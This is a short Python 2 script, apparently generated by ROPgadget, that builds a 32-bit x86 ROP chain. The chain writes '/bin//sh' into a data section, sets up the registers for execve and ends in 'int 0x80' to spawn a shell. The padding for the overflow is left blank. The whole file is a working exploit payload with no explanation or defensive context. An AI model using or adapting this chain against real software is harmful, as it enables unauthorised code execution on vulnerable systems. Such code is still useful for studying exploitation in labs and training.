#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = ''

p += pack('<I', 0xb7d52a72) # pop edx ; ret
p += pack('<I', 0xb7e86040) # @ .data
p += pack('<I', 0xb7d736d3) # pop eax ; ret
p += '/bin'
p += pack('<I', 0xb7dd2ae7) # mov dword ptr [edx], eax ; pop ebp ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0xb7d52a72) # pop edx ; ret
p += pack('<I', 0xb7e86044) # @ .data + 4
p += pack('<I', 0xb7d736d3) # pop eax ; ret
p += '//sh'
p += pack('<I', 0xb7dd2ae7) # mov dword ptr [edx], eax ; pop ebp ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0xb7d52a72) # pop edx ; ret
p += pack('<I', 0xb7e86048) # @ .data + 8
p += pack('<I', 0xb7d7c034) # xor eax, eax ; ret
p += pack('<I', 0xb7dd2ae7) # mov dword ptr [edx], eax ; pop ebp ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0xb7dc03c6) # pop ebx ; ret
p += pack('<I', 0xb7e86040) # @ .data
p += pack('<I', 0xb7d7af5b) # pop ecx ; pop edx ; ret
p += pack('<I', 0xb7e86048) # @ .data + 8
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0xb7d52a72) # pop edx ; ret
p += pack('<I', 0xb7e86048) # @ .data + 8
p += pack('<I', 0xb7d7c034) # xor eax, eax ; ret
p += pack('<I', 0xb7d741e5) # inc eax ; ret
p += pack('<I', 0xb7d741e5) # inc eax ; ret
p += pack('<I', 0xb7d741e5) # inc eax ; ret
p += pack('<I', 0xb7d741e5) # inc eax ; ret
p += pack('<I', 0xb7d741e5) # inc eax ; ret
p += pack('<I', 0xb7d741e5) # inc eax ; ret
p += pack('<I', 0xb7d741e5) # inc eax ; ret
p += pack('<I', 0xb7d741e5) # inc eax ; ret
p += pack('<I', 0xb7d741e5) # inc eax ; ret
p += pack('<I', 0xb7d741e5) # inc eax ; ret
p += pack('<I', 0xb7d741e5) # inc eax ; ret
p += pack('<I', 0xb7d70e1a) # int 0x80
print p
